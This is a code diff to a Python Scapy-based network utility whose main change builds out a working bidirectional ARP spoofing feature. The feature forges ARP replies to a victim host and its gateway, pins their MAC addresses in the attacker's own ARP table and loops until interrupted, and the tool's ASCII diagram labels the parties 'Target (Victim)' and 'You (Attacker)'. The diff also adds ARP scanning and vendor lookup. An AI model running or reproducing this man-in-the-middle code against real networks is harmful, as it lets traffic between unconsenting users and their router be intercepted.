@@ -1,6 +1,6 @@
-import os, sys, time, itertools
+import os, time
 import scapy.all as scapy
-from scapy.all import Ether, ARP, IP, srp, send, atol, conf
+from scapy.all import Ether, ARP, srp, send
 from scapy.interfaces import NetworkInterface
 
 from .utils import *
@@ -56,13 +56,13 @@ class NF_ARPTool:
                 if not is_valid_ipv4(ip):
                     print('[-] IP address entered is invalid.\n')
                 else:
-                    self.get_mac_address_by_ip(ip)
+                    self.get_mac_address_by_ip(ip, verbose=True)
                     print()
             elif i == '3':
                 self.arp_scan()
                 print()
             elif i == '4':
-                self.arp_scan()
+                self.arp_spoof()
                 print()
             elif i == '0':
                 break
@@ -77,11 +77,15 @@ class NF_ARPTool:
 
     #========================= FUNCS =========================#
 
+    def get_manufacturer_by_mac(self, mac: str) -> str:
+        return scapy.conf.manufdb._get_manuf(mac)
+
+
     def show_arp_cache_table(self) -> None:
         if is_windows():
             print('[*] Retrieving ARP cache table of selected interface...')
 
-            run_powershell('''Get-NetNeighbor -AddressFamily IPv4 -InterfaceIndex 24
+            run_powershell(f'Get-NetNeighbor -AddressFamily IPv4 -InterfaceIndex {self.interface.index}' + '''
                 | Sort-Object -Property IPAddress
                 | Where-Object {$_.State -ne 'Unreachable'}''', hide_output=False)
         else:
@@ -89,16 +93,16 @@ class NF_ARPTool:
             print()
 
 
-    def get_mac_address_by_ip(self, ip: str) -> str | None:
-        print(f'[*] Finding which device has {ip}...')
+    def get_mac_address_by_ip(self, ip: str, verbose: bool = False) -> str | None:
+        if verbose: print(f'[*] Finding which device has {ip}...')
         
         ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, iface=self.interface, verbose=0)
         if len(ans) == 0:
-            print('[-] Device not found. Please check the IP.')
+            if verbose: print('[-] Device not found. Please check the IP.')
             return None
 
         mac = ans[0][1][ARP].hwsrc # [0]=first packet, [1]=recv
-        print(f'[+] Device has been found with "{mac}" ({conf.manufdb._get_manuf(mac)})')
+        if verbose: print(f'[+] Device has been found with "{mac}" ({self.get_manufacturer_by_mac(mac)})')
         return mac
 
 
@@ -111,12 +115,12 @@ class NF_ARPTool:
         print(f'[*] Starting the ARP scanning to {network}...')
         ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface=self.interface, verbose=0)
 
-        print('\n{:15}   {:17}   {}'.format('IPv4', 'MAC', 'Vendor (OUI)'))
+        print('\n{:15}   {:17}   {}'.format('IPv4', 'MAC', 'Manufacturer (OUI)'))
         print('=' * 80)
-        for s, r in sorted(ans, key=lambda x: atol(x[1][ARP].psrc)):
+        for s, r in sorted(ans, key=lambda x: scapy.atol(x[1][ARP].psrc)):
             ip  = r[ARP].psrc
             mac = r[ARP].hwsrc # r[Ether].src
-            oui = str_fixed_len(conf.manufdb._get_manuf(mac), 42).strip()
+            oui = str_fixed_len(self.get_manufacturer_by_mac(mac), 42).strip()
             print('{:15}   {:17}   {}'.format(ip, mac, oui))
         print('=' * 80)
         
@@ -142,32 +146,59 @@ class NF_ARPTool:
             print('\n[-] Target IP is invalid.')
             return
 
-        print(f'[*] Starting the bidirectional ARP spoofing... (TAR={target_ip} <---> GW={gateway_ip})\n')
-
-        target_mac  = self.get_mac_by_ip_using_arp(target_ip)
-        gateway_mac = self.get_mac_by_ip_using_arp(gateway_ip)
-        if not target_mac or not gateway_mac:
+        gateway_mac = self.get_mac_address_by_ip(gateway_ip)
+        target_mac  = self.get_mac_address_by_ip(target_ip)
+        if not gateway_mac or not target_mac:
             print('\n[-] MAC address not found. Stop spoofing.')
             return
         
-        print('\n[+] Found all MAC addresses. Now sending forged packets...')
-        print('[*] To stop ARP spoofing, press Ctrl+C keys.\n')
+        print('''
+ +---------------------+                         +---------------------+
+ |   Gateway (Router)  |                         |   Target (Victim)   |
+ +---------------------+         BLOCKED         +---------------------+
+ |   {:^15}   |     <---- (X) ---->     |   {:^15}   |
+ |  {:17}  |                         |  {:17}  |
+ | {:^19} |                         | {:^19} |
+ +---------------------+                         +---------------------+
+ 
+        ^                +---------------------+                ^
+        |                |    You (Attacker)   |                |
+        +------------    +---------------------+    ------------+
+         I'm target!     |   {:^15}   |    I'm gateway!
+                         |  {:17}  |
+                         +---------------------+\n'''.format(
+            gateway_ip, target_ip, gateway_mac, target_mac,
+            str_fixed_len(self.get_manufacturer_by_mac(gateway_mac), 19).strip(),
+            str_fixed_len(self.get_manufacturer_by_mac(target_mac), 19).strip(),
+            self.interface.ip, self.interface.mac))
 
         print('[*] Packet forwarding is required to see packets going to and from the target.')
         print('[*] Packet forwarding can be enabled in the interface menu.\n')
 
+        print('[*] Set gateway and target\'s MAC to static in ARP table for this computer.')
+        ret1 = self.add_static_arp_cache(gateway_ip, gateway_mac)
+        ret2 = self.add_static_arp_cache(target_ip, target_mac)
+        if not ret1 or not ret2:
+            print('[-] Failed to change ARP table.')
+            print('[-] Please retry with root or administrator privilege.')
+            self.remove_arp_cache(gateway_ip)
+            self.remove_arp_cache(target_ip)
+            return
 
         def get_mac(ip):
             return target_mac if ip == target_ip else gateway_mac
         
         def spoof(target_ip, spoof_ip):
             packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
-            send(packet, iface=self.interface, verbose=0)
+            # send(packet, iface=self.interface, verbose=0)
+            r = scapy.sendp(Ether(dst=get_mac(target_ip))/packet, iface=self.interface, verbose=0)
 
         def restore(src_ip, dst_ip):
             packet = ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
             send(packet, iface=self.interface, verbose=0)
 
+        print(f'[*] Starting the bidirectional ARP spoofing...')
+        print('[*] To stop ARP spoofing, press Ctrl+C keys.\n')
         sent_count = 0
         try:
             while True:
@@ -178,14 +209,54 @@ class NF_ARPTool:
                 time.sleep(1) # Wait for a second
         except KeyboardInterrupt:
             print('\n\n[!] Ctrl+C pressed!')
-            print('[*] Restoring ARP tables of target and gateway...\n')
-            sent_count = 0
-            for _ in range(5):
-                restore(gateway_ip, target_ip)
-                restore(target_ip, gateway_ip)
-                sent_count += 2
-                print('\r[*] Packets Sent: ' + str(sent_count), end='')
-                time.sleep(0.5)
-            print('\n\n[+] ARP spoof stopped.')
+
+        print('[*] Removing gateway and target\'s static MAC cache from this computer...')
+        if not self.remove_arp_cache(gateway_ip) or not self.remove_arp_cache(target_ip):
+            print('[-] Failed to remove gateway\'s MAC from ARP table.')
+
+        print('[*] Restoring ARP tables of target and gateway...\n')
+        sent_count = 0
+        for _ in range(5):
+            restore(gateway_ip, target_ip)
+            restore(target_ip, gateway_ip)
+            sent_count += 2
+            print('\r[*] Packets Sent: ' + str(sent_count), end='')
+            time.sleep(0.5)
+
+        print('\n\n[+] ARP spoof stopped.')
+
+
+
+    def add_static_arp_cache(self, ip: str, mac: str) -> bool:
+        self.remove_arp_cache(ip)
+        if is_windows():
+            return run_powershell(f'''New-NetNeighbor
+                -InterfaceIndex {self.interface.index}
+                -IPAddress "{ip}"
+                -LinkLayerAddress "{mac.replace(':', '-')}"
+                -State Permanent''')
+        elif is_linux():
+            print('[-] Currently Linux is not supported.')
+        elif is_macos():
+            print('[-] Currently MacOS is not supported.')
+        else:
+            print('[-] Unknown operating system.')
+        return False
+
+
+    def remove_arp_cache(self, ip: str) -> bool:
+        if is_windows():
+            return run_powershell(f'''Remove-NetNeighbor
+                    -InterfaceIndex {self.interface.index}
+                    -IPAddress "{ip}"
+                    -Confirm:$false''')
+        elif is_linux():
+            print('[-] Currently Linux is not supported.')
+        elif is_macos():
+            print('[-] Currently MacOS is not supported.')
+        else:
+            print('[-] Unknown operating system.')
+        return False
+
 
 
